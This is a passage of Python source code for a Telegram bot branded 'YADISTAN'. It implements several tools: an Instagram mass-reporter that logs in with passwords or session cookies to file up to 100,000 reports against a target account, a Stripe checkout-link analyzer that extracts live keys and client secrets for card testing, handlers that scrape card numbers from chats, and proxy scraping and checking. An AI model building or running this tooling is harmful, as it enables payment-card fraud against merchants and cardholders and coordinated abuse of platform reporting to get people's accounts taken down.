        _fname    = f"{len(cards)}_StreadCHK_{_rand_id}.txt"
        _uhandle  = getattr(message.from_user, 'username', None) or str(uid)

        buf = BytesIO(file_content.encode('utf-8', errors='replace'))
        buf.name = _fname

        # Delete the "Fetching..." processing message before sending file
        try:
            bot.delete_message(message.chat.id, wait_msg.message_id)
        except Exception:
            pass

        bot.send_document(
            message.chat.id, buf,
            caption=_scr_cap(
                username,
                len(cards),
                elapsed,
                msgs_scanned=msgs_scanned,
                dupes_removed=dupes_removed,
                user_handle=_uhandle,
            ),
            parse_mode='HTML',
            reply_to_message_id=message.message_id,
        )

    threading.Thread(target=_worker, daemon=True).start()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  .ig <ig_user> <ig_pass> <target> <reason_num> <count>
#  Instagram Mass Reporter
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _ig_usage():
    reasons = "\n".join(
        f"  <code>{k}</code> — {v[0]}" for k, v in _IG_REASONS.items()
    )
    return (
        "<b>📋 .ig — Instagram Mass Reporter</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "<b>Method 1 — Password login:</b>\n"
        "<code>.ig &lt;user&gt; &lt;pass&gt; &lt;target&gt; &lt;reason&gt; &lt;count&gt;</code>\n\n"
        "<b>Method 2 — Cookie login (bypass checkpoint):</b>\n"
        "<code>.ig cookie &lt;sessionid&gt; &lt;csrftoken&gt; &lt;target&gt; &lt;reason&gt; &lt;count&gt;</code>\n\n"
        "📌 <i>Get cookies: Instagram.com → F12 → Application → Cookies</i>\n\n"
        "<b>Reasons:</b>\n"
        f"{reasons}\n\n"
        "<b>Examples:</b>\n"
        "<code>.ig myuser mypass baduser 8 500</code>\n"
        "<code>.ig cookie 123:ABCsid:12 csrfXYZ baduser 8 500</code>"
    )

_IG_RATE: dict = {}          # uid → last_used timestamp
_IG_COOLDOWN = 60            # seconds between .ig calls per user

@bot.message_handler(commands=["ig"])
def ig_reporter_command(message):
    def _worker():
        uid = message.from_user.id

        # ── Rate limit (.ig: 1 per 60s per user) ─────────────────────────
        now = time.time()
        last = _IG_RATE.get(uid, 0)
        wait = int(_IG_COOLDOWN - (now - last))
        if wait > 0 and uid != admin:
            bot.reply_to(message,
                f"⏳ <b>Wait {wait}s before using .ig again.</b>",
                parse_mode='HTML')
            return
        _IG_RATE[uid] = now

        # ── Delete original message (hides credentials) ───────────────────
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except Exception:
            pass

        args = message.text.split()

        if len(args) < 2:
            bot.send_message(message.chat.id, _ig_usage(), parse_mode='HTML')
            return

        # ── Detect cookie vs password mode ────────────────────────────────
        # Cookie format : .ig cookie <sessionid> <csrftoken> <target> <reason> <count>
        # Password format: .ig <user> <pass> <target> <reason> <count>
        use_cookie = args[1].lower() == 'cookie'

        cid = message.chat.id   # use chat_id for all sends (msg deleted)

        if use_cookie:
            # needs 7 tokens: /ig cookie sid csrf target reason count
            if len(args) < 7:
                bot.send_message(cid,
                    "⚠️ Cookie format:\n"
                    "<code>.ig cookie &lt;sessionid&gt; &lt;csrftoken&gt; &lt;target&gt; &lt;reason&gt; &lt;count&gt;</code>",
                    parse_mode='HTML')
                return
            sessionid  = args[2]
            csrftoken  = args[3]
            target     = args[4]
            try:
                reason_num = int(args[5])
                count      = int(args[6])
            except ValueError:
                bot.send_message(cid,
                    "⚠️ Reason aur count number hone chahiye.\n"
                    "Example: <code>.ig cookie sid csrf target <b>8</b> <b>500</b></code>",
                    parse_mode='HTML')
                return
        else:
            # needs 6 tokens: /ig user pass target reason count
            if len(args) < 6:
                bot.send_message(cid, _ig_usage(), parse_mode='HTML')
                return
            ig_user    = args[1]
            ig_pass    = args[2]
            target     = args[3]
            try:
                reason_num = int(args[4])
                count      = int(args[5])
            except ValueError:
                bot.send_message(cid,
                    "⚠️ Reason aur count number hone chahiye.\n"
                    "Example: <code>.ig user pass target <b>8</b> <b>500</b></code>",
                    parse_mode='HTML')
                return

        if reason_num not in _IG_REASONS:
            bot.send_message(cid,
                "⚠️ Reason 1–9 ke beech hona chahiye.\n" + _ig_usage(),
                parse_mode='HTML')
            return

        count = max(1, min(count, 100000))
        reason_label, reason_tag = _IG_REASONS[reason_num]

        # ── Step 1: Login ─────────────────────────────────────────────────
        if use_cookie:
            proc_msg = bot.send_message(cid,
                "<b>🍪 Verifying cookies...</b>",
                parse_mode='HTML')
            login = ig_login_from_cookies(sessionid, csrftoken)
        else:
            proc_msg = bot.send_message(cid,
                f"<b>🔐 Logging into Instagram...</b>\n<code>@{ig_user}</code>",
                parse_mode='HTML')
            login = ig_login(ig_user, ig_pass)

        if not login['ok']:
            err = login['error']
            hint = ""
            if 'Checkpoint' in err or 'checkpoint' in err:
                hint = (
                    "\n\n💡 <b>Fix:</b> Cookie method use karo:\n"
                    f"<code>.ig cookie &lt;sessionid&gt; &lt;csrftoken&gt; {target} {reason_num} {count}</code>\n\n"
                    "📌 <i>Instagram.com → F12 → Application → Cookies mein\n"
                    "   sessionid aur csrftoken copy karo</i>"
                )
            bot.edit_message_text(
                f"<b>❌ Login Failed</b>\n<code>{err}</code>{hint}",
                proc_msg.chat.id, proc_msg.message_id, parse_mode='HTML'
            )
            return

        session = login['session']
        csrf    = login['csrf']

        # ── Step 2: Resolve target ────────────────────────────────────────
        bot.edit_message_text(
            f"<b>🔍 Resolving target:</b> <code>@{target}</code>",
            proc_msg.chat.id, proc_msg.message_id, parse_mode='HTML'
        )

        tinfo = get_target_id(session, target, csrf)
        if not tinfo['ok']:
            bot.edit_message_text(
                f"<b>❌ Target not found</b>\n<code>{tinfo['error']}</code>",
                proc_msg.chat.id, proc_msg.message_id, parse_mode='HTML'
            )
            return

        target_id = tinfo['id']

        # ── Step 3: Start reporting ───────────────────────────────────────
        bot.edit_message_text(
            f"<b>🔥 Reporting started!</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target  » <code>@{target}</code>\n"
            f"📋 Reason  » {reason_label}\n"
            f"📊 Total   » <code>{count}</code>\n"
            f"⏳ Progress » <code>0 / {count}</code>",
            proc_msg.chat.id, proc_msg.message_id, parse_mode='HTML'
        )

        _last_edit = [0.0]

        def _on_progress(success, fail, done, total):
            now = time.time()
            if now - _last_edit[0] < 4.0:
                return
            _last_edit[0] = now
            pct = int(done / total * 100) if total else 0
            bar_filled = pct // 10
            bar = "█" * bar_filled + "░" * (10 - bar_filled)
            try:
                bot.edit_message_text(
                    f"<b>🔥 Reporting in progress...</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"🎯 Target  » <code>@{target}</code>\n"
                    f"📋 Reason  » {reason_label}\n"
                    f"[{bar}] {pct}%\n"
                    f"✅ Success » <code>{success}</code>\n"
                    f"❌ Failed  » <code>{fail}</code>\n"
                    f"📊 Done    » <code>{done} / {total}</code>",
                    proc_msg.chat.id, proc_msg.message_id, parse_mode='HTML'
                )
            except Exception:
                pass

        result = run_reports(
            session, csrf, target_id, reason_tag,
            total=count, threads=10,
            progress_cb=_on_progress
        )

        # ── Step 4: Final result ──────────────────────────────────────────
        elapsed = round(result['elapsed'], 2)
        speed   = round(result['success'] / result['elapsed'], 2) if result['elapsed'] > 0 else 0
        try:
            bot.edit_message_text(
                f"<b>✅ Report Blast Complete!</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🎯 Target   » <code>@{target}</code>\n"
                f"📋 Reason   » {reason_label}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"✅ Success  » <code>{result['success']}</code>\n"
                f"❌ Failed   » <code>{result['fail']}</code>\n"
                f"⏱ Time     » <code>{elapsed}s</code>\n"
                f"⚡ Speed    » <code>{speed} rep/s</code>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"<i>⌤ YADISTAN 🍀</i>",
                proc_msg.chat.id, proc_msg.message_id, parse_mode='HTML'
            )
        except Exception:
            bot.reply_to(
                message,
                f"<b>✅ Done!</b> {result['success']} reports sent in {elapsed}s",
                parse_mode='HTML'
            )

    threading.Thread(target=_worker, daemon=True).start()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  .strp <stripe_link>  —  Stripe Link Normalizer / Converter
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=["strp"])
def strp_command(message):
    def _worker():
        args = message.text.split(None, 1)
        if len(args) < 2 or not args[1].strip():
            bot.reply_to(message,
                "<b>🔗 .strp — Stripe Link Converter</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "<b>Usage:</b>\n"
                "<code>.strp &lt;stripe_link&gt;</code>\n\n"
                "<b>Supported:</b>\n"
                "• <code>checkout.stripe.com/c/pay/cs_live_...</code>\n"
                "• <code>checkout.stripe.com/c/pay/ppage_...</code>\n"
                "• <code>buy.stripe.com/...</code>\n\n"
                "<b>Example:</b>\n"
                "<code>.strp https://checkout.stripe.com/c/pay/cs_live_b1...</code>",
                parse_mode='HTML',
                disable_web_page_preview=True)
            return

        raw_link = args[1].strip()

        proc = bot.reply_to(message,
            "🔄 <b>Converting Stripe link...</b>",
            parse_mode='HTML')

        result = _strp_convert(raw_link)

        if not result.get('ok'):
            bot.edit_message_text(
                f"<b>❌ Conversion Failed</b>\n"
                f"<code>{result.get('error', 'Unknown error')}</code>",
                proc.chat.id, proc.message_id, parse_mode='HTML')
            return

        # ── Build response ─────────────────────────────────────────────
        import html as _html_mod
        link_type      = result.get('link_type', 'Unknown')
        working_url    = result.get('clean_url', raw_link)
        rebuilt_url    = result.get('rebuilt_url')
        pk_live        = result.get('pk_live')
        client_secret  = result.get('client_secret')
        setup_secret   = result.get('setup_secret')
        pm_ids         = result.get('pm_ids') or []
        merchant       = result.get('merchant')
        amount_fmt     = result.get('amount_fmt', '')
        elapsed        = result.get('elapsed', 0)
        already        = result.get('already_clean', False)
        session_id     = result.get('session_id') or ''
        suggested_cmd  = result.get('suggested_cmd', '.co')
        has_hash       = '#' in working_url

        # Count what we found
        found_count = sum([
            bool(pk_live), bool(client_secret),
            bool(setup_secret), len(pm_ids) > 0
        ])
        status_line = (
            "✅ Already usable" if already else
            f"✅ Analyzed — <b>{found_count}</b> key(s) found"
        )

        # ── Info lines ─────────────────────────────────────────────
        merchant_line = f"│  🏪 Merchant   ›  <code>{_html_mod.escape(merchant)}</code>\n" if merchant else ""
        amt_line      = f"│  💰 Amount     ›  <code>{amount_fmt}</code>\n" if amount_fmt else ""
        sid_line      = f"│  🆔 Session    ›  <code>{session_id}</code>\n" if session_id else ""

        # ── Key lines ──────────────────────────────────────────────
        pk_line = (
            f"│  🔑 PK Key     ›  <code>{pk_live}</code>\n"
            if pk_live else ""
        )

        # client_secret = most valuable — direct PaymentIntent confirm
        if client_secret:
            cs_line = (
                f"│\n"
                f"│  💎 CLIENT SECRET FOUND:\n"
                f"│  <code>{_html_mod.escape(client_secret)}</code>\n"
                f"│  <i>↳ Use: .pi {_html_mod.escape(client_secret)} &lt;card&gt;</i>\n"
            )
        else:
            cs_line = ""

        if setup_secret:
            ss_line = (
                f"│  🔮 Setup Secret ›  <code>{_html_mod.escape(setup_secret)}</code>\n"
            )
        else:
            ss_line = ""

        pm_line = ""
        if pm_ids:
            pm_line = "│  💳 PM IDs:\n"
            for pid in pm_ids[:2]:
                pm_line += f"│    <code>{pid}</code>\n"

        # ── Rebuilt URL (session_id + pk_live → working checkout link) ───
        rebuilt_line = ""
        if rebuilt_url:
            rebuilt_line = (
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"│  🔗 Rebuilt Checkout URL:\n"
                f"<code>{_html_mod.escape(rebuilt_url)}</code>\n"
            )

        # ── Command note ───────────────────────────────────────────
        if rebuilt_url:
            cmd_note = (
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"│  💡 Use rebuilt URL with:\n"
                f"<code>{suggested_cmd} {_html_mod.escape(rebuilt_url)} &lt;card&gt;</code>"
            )
        else:
            cmd_note = (
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"│  💡 Use with:\n"
                f"<code>{suggested_cmd} &lt;url&gt; &lt;card&gt;</code>"
            )

        text = (
            f"<b>🔗 STRIPE LINK ANALYZER</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"│  📋 Type      ›  <code>{link_type}</code>\n"
            f"│  ✅ Status    ›  {status_line}\n"
            f"│  ⏱️ Time      ›  <code>{elapsed}s</code>\n"
            f"{merchant_line}"
            f"{amt_line}"
            f"{sid_line}"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{pk_line}"
            f"{cs_line}"
            f"{ss_line}"
            f"{pm_line}"
            f"{rebuilt_line}"
            f"{cmd_note}"
        )

        try:
            bot.edit_message_text(
                text, proc.chat.id, proc.message_id,
                parse_mode='HTML', disable_web_page_preview=True)
        except Exception:
            bot.reply_to(message, text,
                parse_mode='HTML', disable_web_page_preview=True)

    threading.Thread(target=_worker, daemon=True).start()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  .pscr  —  Proxy Scraper (moved from .scr)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=["pscr"])
def scrape_proxy_pscr_command(message):
    def _pscr_worker():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except Exception:
            BL = '𝗙𝗥𝗘𝗘'

        args = message.text.split()
        proto_filter = args[1].lower() if len(args) > 1 else 'all'

        msg = bot.reply_to(message,
            "<b>🕷️ 𝗣𝗿𝗼𝘅𝘆 𝗦𝗰𝗿𝗮𝗽𝗲𝗿\n━━━━━━━━━━━━━━━━━━━━\n⏳ 𝗙𝗲𝘁𝗰𝗵𝗶𝗻𝗴 𝗳𝗿𝗼𝗺 𝗺𝘂𝗹𝘁𝗶𝗽𝗹𝗲 𝘀𝗼𝘂𝗿𝗰𝗲𝘀...</b>",
            parse_mode='HTML')

        all_proxies = scrape_all_proxies()

        if proto_filter == 'socks5':
            filtered = [p for p in all_proxies if any(k in p.lower() for k in ['socks'])]
            if not filtered:
                filtered = all_proxies
        else:
            filtered = all_proxies

        if not filtered:
            try:
                bot.edit_message_text(chat_id=message.chat.id,
                    message_id=msg.message_id,
                    text="<b>❌ 𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗳𝗼𝘂𝗻𝗱. 𝗧𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿.</b>",
                    parse_mode='HTML')
            except Exception:
                pass
            return

        vip_limit = 500
        free_limit = 50
        limit = vip_limit if BL != '𝗙𝗥𝗘𝗘' else free_limit
        display = filtered[:limit]
        proxy_text = '\n'.join(display)

        header = (
            f"<b>🕷️ 𝗣𝗿𝗼𝘅𝘆 𝗦𝗰𝗿𝗮𝗽𝗲𝗿 ✅\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 𝗧𝗼𝘁𝗮𝗹 𝗦𝗰𝗿𝗮𝗽𝗲𝗱: {len(filtered)}\n"
            f"📋 𝗦𝗵𝗼𝘄𝗶𝗻𝗴: {len(display)} {'(VIP Full)' if BL != '𝗙𝗥𝗘𝗘' else '(FREE – max 50)'}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 𝗨𝘀𝗮𝗴𝗲: .pscr | .pscr socks5\n"
            f"━━━━━━━━━━━━━━━━━━━━\n</b>"
        )

        if len(proxy_text) > 3000:
            try:
                bot.edit_message_text(chat_id=message.chat.id,
                    message_id=msg.message_id,
                    text=header + "<b>📄 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗮𝘀 𝗳𝗶𝗹𝗲...</b>",
                    parse_mode='HTML')
            except Exception:
                pass
            from io import BytesIO
            file_bytes = BytesIO(proxy_text.encode())
            file_bytes.name = "proxies_scraped.txt"
            bot.send_document(message.chat.id, file_bytes,
                caption=f"<b>🕷️ 𝗣𝗿𝗼𝘅𝘆 𝗦𝗰𝗿𝗮𝗽𝗲𝗿 ✅ — {len(display)} 𝗽𝗿𝗼𝘅𝗶𝗲𝘀\n[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>",
                parse_mode='HTML')
        else:
            full_msg = header + f"<code>{proxy_text}</code>\n<b>━━━━━━━━━━━━━━━━━━━━\n[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"
            try:
                bot.edit_message_text(chat_id=message.chat.id,
                    message_id=msg.message_id, text=full_msg, parse_mode='HTML')
            except Exception:
                bot.send_message(message.chat.id, full_msg, parse_mode='HTML')

    threading.Thread(target=_pscr_worker, daemon=True).start()


@bot.message_handler(commands=["scr"])
def scrape_proxy_command(message):
    def my_function():
        _args_check = message.text.split()
        if len(_args_check) >= 2 and is_tg_link(_args_check[1]):
            _tg_scr_handler(message)
        else:
            bot.reply_to(message, _scr_usage(), parse_mode='HTML',
                         disable_web_page_preview=True)

    threading.Thread(target=my_function, daemon=True).start()

# ================== Proxy Checker — /chkpxy ==================

def detect_proxy_type(proxy_str):
    raw = proxy_str.strip().lower()
    if raw.startswith('socks5://'):
        return 'socks5'
    elif raw.startswith('socks4://'):
        return 'socks4'
    elif raw.startswith('http://') or raw.startswith('https://'):
        return 'http'
    parts = raw.split(':')
    if len(parts) >= 2:
        port = parts[1] if parts[1].isdigit() else (parts[3] if len(parts) >= 4 and parts[3].isdigit() else '')
        if port in ['1080', '1081', '9050', '9150']:
            return 'socks5'
    return 'http'

def build_proxy_dict(proxy_str, proto=None):
    raw = proxy_str.strip()
    if any(raw.lower().startswith(p) for p in ['http://', 'https://', 'socks4://', 'socks5://']):
        return {'http': raw, 'https': raw}

    if proto is None:
        proto = detect_proxy_type(raw)

    parts = raw.split(':')
    if len(parts) == 2:
        ip, port = parts
        return {'http': f'{proto}://{ip}:{port}', 'https': f'{proto}://{ip}:{port}'}
    elif len(parts) == 4:
        try:
            int(parts[1])
            ip, port, user, pwd = parts
        except ValueError:
            user, pwd, ip, port = parts
        return {
            'http':  f'{proto}://{user}:{pwd}@{ip}:{port}',
            'https': f'{proto}://{user}:{pwd}@{ip}:{port}'
        }
    else:
        return {'http': f'{proto}://{raw}', 'https': f'{proto}://{raw}'}

def check_single_proxy(proxy_str, timeout=8):
    detected_type = detect_proxy_type(proxy_str)
    protocols_to_try = [detected_type]
    if detected_type == 'http':
        protocols_to_try.append('socks5')
    elif detected_type == 'socks5':
        protocols_to_try.append('http')

    last_error = "Unknown"
    for proto in protocols_to_try:
        try:
            proxy_dict = build_proxy_dict(proxy_str, proto)
            start = time.time()
            r = requests.get("http://ip-api.com/json", proxies=proxy_dict,
                             timeout=timeout, verify=False)
            elapsed = round((time.time() - start) * 1000)
            if r.ok:
                data = r.json()
                country = data.get('country', 'Unknown')
                isp = data.get('isp', 'Unknown')
                ptype = proto.upper()
                return True, elapsed, f"{country} ({ptype})", isp
        except requests.exceptions.ProxyError:
            last_error = f"Proxy refused ({proto})"
        except requests.exceptions.ConnectTimeout:
            last_error = f"Timeout ({proto})"
        except Exception as e:
            last_error = str(e)[:40]

    return False, None, None, last_error

def extract_proxies_from_text(text):
    proxy_list = []
    for line in text.strip().split('\n'):
        line = line.strip()
        if not line or line.startswith('/'):
            continue
        if ':' in line and len(line) >= 7:
            parts = line.split(':')
            if len(parts) >= 2:
                proxy_list.append(line)
    return proxy_list

@bot.message_handler(commands=["chkpxy"])
def check_proxy_command(message):
    def my_function():
        proxy_list = []

        lines = message.text.strip().split('\n')
        first_line_parts = lines[0].split(None, 1)

        if len(first_line_parts) >= 2:
            inline_proxy = first_line_parts[1].strip()
            if inline_proxy:
                proxy_list.append(inline_proxy)
        for l in lines[1:]:
            l = l.strip()
            if l:
                proxy_list.append(l)

        if not proxy_list and message.reply_to_message:
            reply = message.reply_to_message
            if reply.text:
                proxy_list = extract_proxies_from_text(reply.text)
            elif reply.document:
                try:
                    file_info = bot.get_file(reply.document.file_id)
                    file_data = bot.download_file(file_info.file_path)
                    file_text = file_data.decode('utf-8', errors='ignore')
                    proxy_list = extract_proxies_from_text(file_text)
                except Exception as e:
                    bot.reply_to(message, f"<b>❌ 𝗙𝗶𝗹𝗲 𝗿𝗲𝗮𝗱 𝗲𝗿𝗿𝗼𝗿: {str(e)[:50]}</b>")
                    return

        if not proxy_list:
            bot.reply_to(message,
                "<b>🔍 𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 (𝗛𝗧𝗧𝗣/𝗦𝗢𝗖𝗞𝗦𝟱/𝗦𝗢𝗖𝗞𝗦𝟰)\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "📌 𝗦𝗶𝗻𝗴𝗹𝗲:\n"
                "<code>/chkpxy 1.2.3.4:8080</code>\n"
                "<code>/chkpxy socks5://1.2.3.4:1080</code>\n\n"
                "📌 𝗕𝘂𝗹𝗸 (𝗣𝗮𝗿𝗮𝗹𝗹𝗲𝗹):\n"
                "<code>/chkpxy\n"
                "1.2.3.4:8080\n"
                "socks5://5.6.7.8:1080\n"
                "9.0.1.2:1080:user:pass</code>\n\n"
                "📌 𝗥𝗲𝗽𝗹𝘆 𝗠𝗼𝗱𝗲:\n"
                "𝗥𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 𝗺𝗲𝘀𝘀𝗮𝗴𝗲/𝗳𝗶𝗹𝗲 𝘄𝗶𝘁𝗵 /chkpxy\n\n"
                "💡 𝗔𝘂𝘁𝗼-𝗱𝗲𝘁𝗲𝗰𝘁𝘀 𝗛𝗧𝗧𝗣/𝗦𝗢𝗖𝗞𝗦𝟱\n"
                "⚡ 𝗕𝘂𝗹𝗸 𝗰𝗵𝗲𝗰𝗸𝘀 𝟭𝟬 𝗮𝘁 𝗮 𝘁𝗶𝗺𝗲\n"
                "━━━━━━━━━━━━━━━━━━━━</b>")
            return

        if len(proxy_list) == 1:
            proxy_str = proxy_list[0]
            wait_msg = bot.reply_to(message,
                f"<b>🔍 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝘅𝘆...\n⏳ <code>{proxy_str}</code></b>")
            alive, ms, country, info = check_single_proxy(proxy_str)
            if alive:
                result_text = (
                    f"<b>🔍 𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸 𝗥𝗲𝘀𝘂𝗹𝘁\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"[ϟ] 𝗣𝗿𝗼𝘅𝘆: <code>{proxy_str}</code>\n"
                    f"[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: ✅ 𝗟𝗜𝗩𝗘\n"
                    f"[ϟ] 𝗦𝗽𝗲𝗲𝗱: {ms}ms\n"
                    f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}\n"
                    f"[ϟ] 𝗜𝗦𝗣: {info}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"
                )
            else:
                result_text = (
                    f"<b>🔍 𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸 𝗥𝗲𝘀𝘂𝗹𝘁\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"[ϟ] 𝗣𝗿𝗼𝘅𝘆: <code>{proxy_str}</code>\n"
                    f"[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: ❌ 𝗗𝗘𝗔𝗗\n"
                    f"[ϟ] 𝗥𝗲𝗮𝘀𝗼𝗻: {info}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"
                )
            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=wait_msg.message_id,
                    text=result_text)
            except:
                pass
            return

        MAX_BULK = 500
        total = len(proxy_list)
        if total > MAX_BULK:
            proxy_list = proxy_list[:MAX_BULK]
            total = MAX_BULK

        live_list = []
        dead_count = [0]
        checked = [0]
        results_lines = []
        bulk_lock = threading.Lock()
        stopped = [False]

        THREADS = min(10, total)

        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))

        id = message.from_user.id
        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}

        msg = bot.reply_to(message,
            f"<b>🔍 𝗕𝘂𝗹𝗸 𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⚡\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📋 𝗧𝗼𝘁𝗮𝗹: {total} 𝗽𝗿𝗼𝘅𝗶𝗲𝘀\n"
            f"🧵 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {THREADS}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴...</b>", reply_markup=stop_kb)

        def build_bulk_msg(status="⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."):
            with bulk_lock:
                c = checked[0]
                ll = len(live_list)
                dc = dead_count[0]
                last_lines = list(results_lines[-12:])
                last_live = list(live_list[-10:])
            header = (
                f"<b>🔍 𝗕𝘂𝗹𝗸 𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⚡ | {status}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📊 {c}/{total} | ✅ {ll} 𝗟𝗶𝘃𝗲 | ❌ {dc} 𝗗𝗲𝗮𝗱 | 🧵 {THREADS}x\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
            )
            body = "\n".join(last_lines)
            footer_hits = ""
            if last_live:
                footer_hits = (
                    f"\n━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ 𝗟𝗜𝗩𝗘 𝗣𝗥𝗢𝗫𝗜𝗘𝗦:\n" +
                    "".join(f"✅ <code>{p}</code>\n" for p in last_live)
                )
            return header + body + footer_hits + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"

        from queue import Queue as TQueue
        proxy_queue = TQueue()
        for p in proxy_list:
            proxy_queue.put(p)

        def worker_thread():
            while not proxy_queue.empty():
                if stopped[0] or stopuser.get(f'{id}', {}).get('status') == 'stop':
                    stopped[0] = True
                    return
                try:
                    proxy_str = proxy_queue.get_nowait()
                except:
                    return

                alive, ms, country, info = check_single_proxy(proxy_str, timeout=8)

                with bulk_lock:
                    checked[0] += 1
                    if alive:
                        live_list.append(proxy_str)
                        results_lines.append(f"✅ <code>{proxy_str}</code> | {ms}ms | {country}")
                    else:
                        dead_count[0] += 1
                        results_lines.append(f"❌ <code>{proxy_str}</code> | {info}")

                proxy_queue.task_done()

        workers = []
        for _ in range(THREADS):
            t = threading.Thread(target=worker_thread, daemon=True)
            t.start()
            workers.append(t)

        last_update = time.time()
        while any(t.is_alive() for t in workers):
            time.sleep(0.5)
            now = time.time()
            if now - last_update >= 2:
                last_update = now
                if stopped[0]:
                    break
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                        text=build_bulk_msg(), reply_markup=stop_kb)
                except:
                    pass

        for t in workers:
            t.join(timeout=1)

        minux_keyboard = types.InlineKeyboardMarkup()
        minux_keyboard.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))

        final_status = "🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗" if stopped[0] else "✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!"
        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                text=build_bulk_msg(final_status), reply_markup=minux_keyboard)
        except:
            pass

        if live_list and len(live_list) >= 1:
            from io import BytesIO
            live_text = "\n".join(live_list)
            file_bytes = BytesIO(live_text.encode())
            file_bytes.name = "live_proxies.txt"
            bot.send_document(message.chat.id, file_bytes,
                caption=f"<b>✅ {len(live_list)} 𝗟𝗶𝘃𝗲 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 (𝗼𝘂𝘁 𝗼𝗳 {total})\n[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>",
                parse_mode='HTML')

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    id = call.from_user.id
    try:
        stopuser[f'{id}']['status'] = 'stop'
    except Exception:
        stopuser[f'{id}'] = {'status': 'stop'}
    bot.answer_callback_query(call.id, "🛑 Stopped!", show_alert=False)
    try:
        orig = call.message.text or call.message.caption or ""
        first_line = orig.split('\n')[0] if orig else "Checker"
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"{first_line}\n\n<b>🛑 STOPPED by user.</b>",
            parse_mode='HTML'
        )
    except:
        pass

@bot.callback_query_handler(func=lambda call: call.data == 'ping_inline')
def ping_inline_callback(call):
